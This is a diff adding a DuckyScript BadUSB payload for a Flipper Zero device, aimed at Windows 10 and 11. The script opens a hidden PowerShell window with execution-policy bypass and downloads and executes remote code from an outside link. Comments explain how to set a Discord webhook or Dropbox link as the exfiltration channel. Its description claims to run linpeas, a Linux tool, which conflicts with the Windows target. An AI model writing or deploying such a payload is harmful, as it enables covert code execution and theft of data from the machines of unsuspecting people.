@@ -1,0 +1,16 @@
+REM     Title: Flipper-PEASS-ng
+
+REM     Author: theredhammer thanks to I am Jakoby payloads and videos
+
+REM     Description: This payload will execute linpeas to kbnow possible vulnerabilities
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -ep bypass $dc='';iwr https://link.iamjakoby.com/ToDo | iex
+ENTER
+
+REM     Fill in either variable or both to set your exfil method.
+REM     $dc is the variable that holds your Discord webhook.   
+REM     If you are using DropBox, also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly.
